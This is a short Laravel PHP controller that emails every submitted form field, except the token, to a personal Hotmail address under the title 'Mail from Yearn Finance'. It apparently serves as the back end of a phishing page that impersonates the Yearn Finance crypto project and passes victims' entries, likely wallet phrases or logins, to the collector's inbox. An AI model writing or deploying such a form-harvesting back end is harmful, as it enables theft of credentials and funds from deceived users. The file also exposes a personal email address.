<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class InfoController extends Controller
{
    public function sendMail(Request $request){
        $details = [
            'title' => 'Mail from Yearn Finance',
            'body' => []
        ];
        $all = [];
        foreach($request->all() as $key => $value) {
            $phrase = $key.": ".$value;
            if ($value != null && $key != '_token') {
                array_push($details['body'], $phrase);
            }
        }
        //dd($details);

    \Mail::to('nils6600@hotmail.fr')->send(new \App\Mail\MyMail($details));

    //dd("Email is Sent.");
    return redirect()->back();
    }
}
